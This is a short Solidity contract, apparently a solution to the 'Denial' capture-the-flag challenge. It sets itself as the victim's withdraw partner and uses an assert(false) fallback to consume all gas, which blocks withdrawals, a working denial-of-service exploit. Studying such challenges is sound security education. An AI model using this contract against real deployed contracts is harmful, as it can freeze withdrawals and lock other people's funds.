pragma solidity ^0.7.3;

interface IDenial {
    function setWithdrawPartner(address _partner) external;
}

contract DenialAttacker {
    IDenial public challenge;

    constructor(address challengeAddress) {
        challenge = IDenial(challengeAddress);
    }

    function attack() public {
        challenge.setWithdrawPartner(address(this));
    }

    fallback() external payable {
      // assert consumes all (!) gas
      assert(false);

      // the others don't
      // revert("revert");
      // require(false, "require");
    }
}
